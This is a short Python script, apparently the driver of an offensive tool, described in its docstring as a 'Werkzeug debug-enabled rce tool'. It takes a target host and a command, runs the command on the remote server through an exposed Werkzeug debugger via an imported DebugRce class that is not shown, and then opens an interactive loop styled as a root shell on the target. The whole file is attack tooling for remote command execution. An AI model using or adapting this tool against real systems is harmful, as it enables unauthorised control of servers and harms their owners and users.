#!/usr/bin/env python
'''Werkzeug debug-enabled rce tool'''

from argparse import ArgumentParser
from sys import exit as sysexit, argv

from werkzeug_rce import DebugRce

if __name__ == '__main__':

	parser = ArgumentParser()
	parser.add_argument('-t', '--host', type=str,
						required=True, help='Target host to test')
	parser.add_argument('-c', '--cmd', type=str,
						required=True, help='Cmd to inject')
	args = parser.parse_args()
	
	d = DebugRce(args.host)
	for line in d.exec(args.cmd):
		print(line)

	while True:
		try:
			cmd = input(f'root@{args.host}:~$ ')
			for line in d.exec(cmd):
				print(line)
		except KeyboardInterrupt:
			print('\nQuitting!')
			sysexit()
